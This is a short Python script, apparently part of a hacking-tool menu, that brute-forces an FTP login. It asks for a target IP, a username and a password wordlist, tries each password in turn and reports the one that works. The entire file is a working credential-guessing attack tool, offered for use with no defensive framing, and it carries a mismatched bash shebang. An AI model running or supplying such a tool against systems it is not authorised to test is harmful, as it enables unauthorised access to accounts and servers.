#!/bin/bash

import ftplib
from termcolor import colored
from f_text import *

def brute_ftp(hostname,uname,file):
	for  passwd in file.readlines():
		passwd = passwd.strip('\n')
		print (colored(f"[*] Trying: {passwd}", 'yellow'))
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(uname,passwd)
			print (colored(f"[*] FTP Login Success!\n[+] Password: {passwd}", 'green'))
			ftp.quit()
			return True
		except Exception:
#			pass
#			print (colored(f"[-] {uname} : {passwd} FTP Login Failed", 'red'))
			print (colored("[-] FTP login Failed", 'red'))
	print (colored("[*] No valid password found",'red'))

def ftpb_run():
	print (standard_blue('FTP'), standard_red('Brute'))
	host = input(colored("[*] Enter target IP address: ", 'blue'))
	uname = input(colored("[*] Enter username to brute: ", "blue"))
#	file = open('passwd.txt','r')
	f_name = input(colored("[*] Enter local file name: ", 'blue'))
	file = open(f_name, 'r')
	brute_ftp(host,uname,file)
	input(colored("\n[*] Press Enter to return to main menu", 'yellow'))

if __name__ == '__main__':
	ftpb_run()



